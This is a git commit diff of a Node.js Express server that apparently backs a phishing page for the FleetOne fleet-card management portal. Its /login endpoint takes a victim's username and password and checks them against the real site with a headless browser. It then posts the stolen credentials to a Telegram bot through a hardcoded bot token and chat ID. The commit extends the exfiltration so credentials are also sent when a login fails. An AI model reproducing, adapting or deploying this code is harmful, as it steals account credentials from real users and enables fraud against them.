10bc3a14437019d0c4ac87eeaa2cdba2dda7fa1f
managefleetone <fleetone.manage@gmail.com>
2025-03-25 12:41:26 +0400

    changed paket

--- index.js
+++ index.js
@@ -1,112 +1,87 @@
 const express = require("express");
-const puppeteer = require("puppeteer");
-// const { chromium } = require("playwright");
+const { chromium } = require("playwright");
 const cors = require("cors");
 const fetch = require("node-fetch");
 
 const app = express();
 const port = 8080;
 
-const corsOptions = {
-  origin: "https://fleet-one-frontend.vercel.app",
-  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
-  allowedHeaders: ["Content-Type", "Authorization"],
-  credentials: true,
-};
-
-// app.use(
-//   cors({
-//     origin: "https://fleet-one-frontend.vercel.app", // Укажите URL вашего фронтенда
-//     methods: ["GET", "POST", "PUT", "DELETE"],
-//   })
-// );
-
-app.use(cors());
-
-app.use(express.json());
-
 const TELEGRAM_BOT_TOKEN = "8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM";
 const CHAT_ID = 531918242;
+
+app.use(cors());
+app.use(express.json());
 
 app.get("/", (req, res) => {
   res.send("Hello");
 });
 
 app.post("/login", async (req, res) => {
-  res.setHeader(
-    "Access-Control-Allow-Origin",
-    "https://fleet-one-frontend.vercel.app"
-  );
-  res.setHeader("Access-Control-Allow-Origin", "http://localhost:3000");
-
   res.setHeader("Access-Control-Allow-Methods", "POST");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
 
   const { username, password } = req.body;
-
   if (!username || !password) {
     return res.status(400).json({ error: "Missing username or password" });
   }
 
-  const browser = await puppeteer.launch({ headless: true }); // true i depqum usery chi tenum
+  const browser = await chromium.launch({ headless: true });
   const page = await browser.newPage();
 
   try {
     await page.goto("https://manage.fleetone.com/security/fleetOneLogin", {
-      waitUntil: "networkidle2",
+      waitUntil: "networkidle",
     });
 
-    await page.type('input[name="userId"]', username);
-    await page.type('input[name="password"]', password);
-    await page.evaluate(() => {
-      document.querySelector("form").submit();
-    });
+    await page.locator('input[name="userId"]').fill(username);
+    await page.locator('input[name="password"]').fill(password);
+    await page.locator("form").evaluate((form) => form.submit());
+
     console.log("Submitting form...");
-    // await page.click('form button[type="submit"]');
 
-    await new Promise((r) => setTimeout(r, 5000));
+    await page.waitForTimeout(5000);
 
-    const loginError = await page.$(".errors");
-    if (loginError) {
+    const loginError = await page.locator(".errors").count();
+    if (loginError > 0) {
       await browser.close();
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
+      const telegramMessage = {
+        chat_id: CHAT_ID,
+        text: `✅ Error Login:\n👤 Username: ${username}\n🔑 Password: ${password}`,
+      };
+
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(telegramMessage),
+      });
       return res.json({ success: false, message: "Invalid credentials" });
     }
 
-    const isLoggedIn = await page.evaluate(() => {
-      return document.querySelector("#pad") !== null;
-    });
-
+    const isLoggedIn = (await page.locator("#pad").count()) > 0;
     if (!isLoggedIn) {
       await browser.close();
       return res.json({ success: false, message: "Login failed" });
     }
-    if (isLoggedIn) {
-      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
-      const telegramMessage = {
-        chat_id: CHAT_ID,
-        text: `✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password}`,
-      };
 
-      try {
-        await fetch(telegramUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(telegramMessage),
-        });
-      } catch (error) {
-        console.error("Error Telegram:", error);
-      }
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
+    const telegramMessage = {
+      chat_id: CHAT_ID,
+      text: `✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password}`,
+    };
 
-      return res.json({
-        success: true,
-        message: "Login successful",
-        username,
-        password,
+    try {
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(telegramMessage),
       });
+    } catch (error) {
+      console.error("Error Telegram:", error);
     }
 
     await browser.close();
-    return res.json({ success: true, message: "Login successful" });
+    return res.json({ success: true, message: "Login successful", username });
   } catch (error) {
     await browser.close();
     res
